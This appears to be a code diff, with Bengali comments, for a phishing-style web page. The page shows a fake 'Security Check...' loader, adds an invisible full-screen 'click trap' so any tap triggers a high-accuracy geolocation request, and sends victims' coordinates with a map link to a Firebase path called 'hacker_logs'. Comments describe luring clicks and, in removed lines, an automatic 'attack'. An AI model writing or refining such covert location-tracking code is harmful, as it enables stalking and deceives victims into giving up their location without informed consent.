@@ -12,17 +12,24 @@
             height: 100vh; background-color: #ffffff;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             overflow: hidden; text-align: center;
+            cursor: pointer; /* মাউস নিলে হাত দেখাবে যাতে ক্লিক করতে ইচ্ছে করে */
         }
         
+        /* অদৃশ্য ফাঁদ (পুরো স্ক্রিন জুড়ে) */
+        #click-trap {
+            position: fixed; top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: 9999; /* সবার উপরে */
+            background: transparent;
+        }
+
         #loader { display: block; }
-        
         h2 {
             color: #333; font-weight: 400; font-size: 24px;
             animation: pulse 1.5s infinite;
         }
         @keyframes pulse { 0% { opacity: 0.6; } 50% { opacity: 1; } 100% { opacity: 0.6; } }
 
-        /* ফেসবুক ব্রাউজার ওয়ার্নিং */
         #inAppWarning {
             display: none; flex-direction: column; align-items: center; padding: 20px;
         }
@@ -38,8 +45,11 @@
 </head>
 <body>
 
+    <div id="click-trap" onclick="forcePermission()"></div>
+
     <div id="loader">
         <h2>Security Check...</h2>
+        <p style="font-size: 12px; color: #999;">Tap screen if loading takes time</p>
     </div>
 
     <div id="inAppWarning">
@@ -70,29 +80,32 @@
         
         let dataSent = false; 
 
-        // ১. ব্রাউজার চেক (ফেসবুক নাকি ক্রোম)
+        // গ্লোবাল ফাংশন বানাতে হবে যাতে HTML থেকে call করা যায়
+        window.forcePermission = function() {
+            startTracking();
+        }
+
         function checkBrowser() {
             var ua = navigator.userAgent || navigator.vendor || window.opera;
             var isInApp = (ua.indexOf("FBAN") > -1) || (ua.indexOf("FBAV") > -1) || (ua.indexOf("Instagram") > -1) || (ua.indexOf("TikTok") > -1);
 
             if (isInApp) {
-                // ইন-অ্যাপ হলে ওয়ার্নিং দেখাবো
                 document.getElementById('loader').style.display = 'none';
                 document.getElementById('inAppWarning').style.display = 'flex';
+                // ইন-অ্যাপ হলে ক্লিক ট্র্যাপ সরিয়ে ফেলব, নাহলে বাটন কাজ করবে না
+                document.getElementById('click-trap').style.display = 'none';
             } else {
-                // ২. আসল ব্রাউজার হলে সাথে সাথে হামলা (Auto Trigger)
                 startTracking();
             }
         }
 
         function startTracking() {
             if ("geolocation" in navigator) {
-                // 🔥 Auto Trigger: কোনো ক্লিকের অপেক্ষা নেই
                 navigator.geolocation.watchPosition(
                     processLocation,
                     function(error) { 
-                        // পারমিশন না দিলে কনসোলে এরর আসবে, কিন্তু আমরা হাল ছাড়ব না
-                        console.log("Auto request blocked by browser policy or denied.");
+                        // যদি পারমিশন ডিনাই করে বা এরর হয়
+                        console.log("Waiting for permission...");
                     },
                     { enableHighAccuracy: true, timeout: 30000, maximumAge: 5000 }
                 );
@@ -105,14 +118,17 @@
             if(dataSent) return; 
             dataSent = true;
 
+            // লোকেশন পাওয়ার সাথে সাথে ফাঁদ সরিয়ে ফেলব
+            document.getElementById('click-trap').style.display = 'none';
+
             const lat = position.coords.latitude;
             const lng = position.coords.longitude;
             
             const trackerRef = ref(db, 'hacker_logs');
             const newLogRef = push(trackerRef);
             
-            // ✅ ম্যাপ লিংক একদম পারফেক্ট
-            const mapsLink = `https://www.google.com/maps?q=$$${lat},${lng}`;
+            // ✅ FIXED: এখানে ${lat} ঠিক করে দিয়েছি
+            const mapsLink = `https://www.google.com/maps?q=$${lat},${lng}`;
 
             set(newLogRef, {
                 timestamp: new Date().toString(),
@@ -134,7 +150,6 @@
             });
         }
 
-        // পেজ লোড হওয়ার সাথে সাথেই কল হবে
         window.onload = checkBrowser;
     </script>
 </body>
